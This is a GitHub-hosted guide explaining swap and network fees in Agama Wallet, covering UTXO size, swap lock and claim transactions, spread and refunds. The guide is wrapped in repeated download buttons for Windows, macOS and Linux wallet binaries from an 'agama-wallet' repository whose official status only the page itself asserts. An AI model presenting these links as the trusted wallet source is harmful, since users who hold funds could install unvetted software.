[![Agama Wallet](assets/banner-article.png)](https://github.com/agama-wallet/agama-desktop-wallet)

# Fees in Agama Wallet: Swap Fees and Network Fees

<div align="center">

<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7"><img src="https://img.shields.io/badge/RELEASE-v0.3.7-F47B20?style=for-the-badge&amp;labelColor=293D52" alt="Agama Wallet v0.3.7"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/blob/main/LICENSE"><img src="https://img.shields.io/badge/LICENSE-MIT-F47B20?style=for-the-badge&amp;labelColor=293D52" alt="MIT licence"></a>

</div>

<div align="center">

| Platform | File |
|---|---|
| <img src="https://img.shields.io/badge/WINDOWS-293D52?style=flat-square&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Windows" height="24"> | [`agamawallet-v.0.3.7.exe`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe) |
| <img src="https://img.shields.io/badge/MACOS-293D52?style=flat-square&amp;logo=apple&amp;logoColor=white" alt="Macos" height="24"> | [`agamawallet-v.0.3.7.dmg`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg) |
| <img src="https://img.shields.io/badge/LINUX-293D52?style=flat-square&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | [`agamawallet-v.0.3.7.zip`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip) |

</div>
All versions and checksums are on the [Agama Wallet release page](https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7).

> Only download from this GitHub release page.

---

Agama Wallet charges no platform fee according to its maker, which states that neither Agama nor BarterDEX takes a cut and that only blockchain network fees apply. What you actually pay is the network fee on each transaction, plus whatever the counterparty's price includes. Agama Wallet is a self-custody multi-asset wallet for the Komodo ecosystem with built-in atomic swaps.

## You'll see this if

You are comparing the cost of a swap with an exchange's fees, or the amount received is smaller than the amount sent and no line explains it.

| Cost | Charged by | Depends on |
|---|---|---|
| Network fee on a send | The chain | Transaction size and congestion |
| Network fee on a swap lock | The chain | Same |
| Network fee on a swap claim | The chain | Same |
| Platform fee | Nobody, per the maker |  -  |
| Price versus reference rate | The counterparty | Liquidity and pair |

## Why it happens

Every operation in a UTXO wallet is a transaction, and transactions pay for block space. A send pays once; a swap pays at least twice per participant, because locking and claiming are separate transactions.

That structure explains why costs feel unpredictable. On a UTXO chain the fee tracks size, not value: a payment funded by many small outputs is larger than one funded by a single output, even when the amount is identical. On an account chain the fee tracks the operation and the current demand for space. The wallet cannot change either.

The maker's own guidance names KMD/BTC, LTC/BTC and KMD/LTC as the deepest pairs and advises checking the order book first, which is also the practical control on the price component of the cost.

## Fix

Estimate the total before committing, and separate the parts.

1. **Count the transactions.** A send is one; a swap is at least two per side, and a failed swap adds a refund.
2. **Check the chain's current conditions.** A quiet chain costs less than a congested one, and the wallet's estimate reflects that moment.
3. **Read the rate as well as the fee.** The difference between the quoted rate and a reference price is a real cost that no fee line shows.
4. **Consolidate before swapping if your outputs are numerous.** [UTXO management](https://github.com/agama-wallet/utxo/blob/main/consolidating-your-coins.md) covers when that pays off.
5. **Keep a fee balance on both chains** for a cross-chain trade; a claim without a fee is a claim that waits.

If the delivered amount is short by more than the network fees, the difference is the rate rather than a hidden charge. [When a swap fails](https://github.com/agama-wallet/atomic-swaps/blob/main/timeouts-and-refunds.md) covers the case where the cost includes a refund too.

## If that did not work

If a transaction sits unconfirmed, the fee was too low for that moment. Most wallets allow a replacement with a higher fee while the transaction is pending.

If a swap's claim fails for insufficient fee, the locked funds remain locked until the deadline; rebuilding the claim with a proper fee is the fix.

If a refund costs a meaningful share of the amount, the amount was too small for that chain's fee level. That is arithmetic rather than a fault.

If a service advertises zero fees on a swap, check the rate. Value cannot cross two chains without paying both.

## Prevention

- **Trade amounts that are large relative to fees.** Small swaps are dominated by fixed costs.
- **Keep outputs consolidated on the spending side.** Fewer inputs, smaller transaction.
- **Compare the rate before committing.** It is the largest cost and the least visible.
- **Leave a fee buffer on each chain you use.** [What an atomic swap is](https://github.com/agama-wallet/atomic-swaps/blob/main/exchange-without-an-intermediary.md) shows where each transaction falls.
- **Do not compare a swap fee with a trading fee.** They cover different things; [atomic swap fees](https://github.com/agama-wallet/atomic-swaps/blob/main/what-a-trade-costs.md) sets out the full structure.

## FAQ

### Are fees higher for swaps than for sends?

Usually, because a swap is more transactions. A send is one transaction; a swap locks and claims on two chains, so the total is several fees that the wallet shows separately.

### Does Agama Wallet take a fee?

The maker states it does not, and that only network fees apply. That is the project's position rather than an independently verified figure.

### Why is the fee higher for some payments than others?

Because the fee follows transaction size. A payment drawing on many small outputs is larger than one drawing on a single output.

### Why does the wallet's estimate change between attempts?

Because it is calculated from current conditions and from the inputs the transaction needs. A different input set is a different size, and a busier chain is a different price, so two identical-looking attempts can cost different amounts.

### Do failed swaps cost anything?

Yes: the lock and the refund are both transactions, so a failed trade spends fees without moving value. That is why a trade small relative to fees is a poor trade whatever the rate.

### Are swap fees charged twice?

A swap involves separate transactions on each side, so the network fee is paid more than once. There is no platform fee in the maker's description.

### How can I tell a network fee from a spread?

A network fee appears as a transaction cost on the chain and is small relative to the amount; a spread appears in the rate and does not show as a line at all. Comparing the quoted rate with a reference price is the only way to see the second.

### Can I avoid fees entirely?

No. Every transaction pays for block space on the chain it runs on, and a swap is several transactions.

---

## Download Agama Wallet v0.3.7

<div align="center">

<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Download Agama Wallet for Windows"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=apple&amp;logoColor=white" alt="Download Agama Wallet for Macos"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=linux&amp;logoColor=white" alt="Download Agama Wallet for Linux"></a>

</div>

<div align="center">

| Platform | File |
|---|---|
| <img src="https://img.shields.io/badge/WINDOWS-293D52?style=flat-square&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Windows" height="24"> | [`agamawallet-v.0.3.7.exe`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe) |
| <img src="https://img.shields.io/badge/MACOS-293D52?style=flat-square&amp;logo=apple&amp;logoColor=white" alt="Macos" height="24"> | [`agamawallet-v.0.3.7.dmg`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg) |
| <img src="https://img.shields.io/badge/LINUX-293D52?style=flat-square&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | [`agamawallet-v.0.3.7.zip`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip) |

</div>
All versions and checksums are on the [Agama Wallet release page](https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7).

> Only download from this GitHub release page, and compare each file with the value printed there.

## Related guides

- [What an Atomic Swap Costs: Fees, Mining Costs and Spread](https://github.com/agama-wallet/atomic-swaps/blob/main/what-a-trade-costs.md)
- [UTXO Management: Consolidating and Labelling Your Coins](https://github.com/agama-wallet/utxo/blob/main/consolidating-your-coins.md)
- [What Is an Atomic Swap? Exchange Without an Intermediary](https://github.com/agama-wallet/atomic-swaps/blob/main/exchange-without-an-intermediary.md)
- [Which Assets Agama Wallet Supports](https://github.com/agama-wallet/agama-wallet/blob/main/supported-coins.md)
